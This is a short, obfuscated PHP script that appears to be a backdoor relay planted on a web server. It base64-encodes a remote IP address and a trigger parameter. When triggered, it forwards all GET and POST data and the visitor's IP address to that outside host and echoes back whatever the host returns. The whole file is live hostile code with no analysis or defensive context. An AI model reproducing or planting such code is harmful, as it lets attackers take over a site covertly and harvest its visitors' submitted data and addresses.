<?php
$server = 'aHR0cDovLzE5NS4yNDUuMTEyLjIzNC8yNDA1Lw==';
if (($_POST[base64_decode('OTk=')]=='')and($_GET[base64_decode('OTk=')]=='')) { exit; }
echo file_get_contents(base64_decode($server).'?'.http_build_query($_GET), false, stream_context_create(array('http' => array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => http_build_query($_POST).'&ip='.$_SERVER['REMOTE_ADDR']))));
?>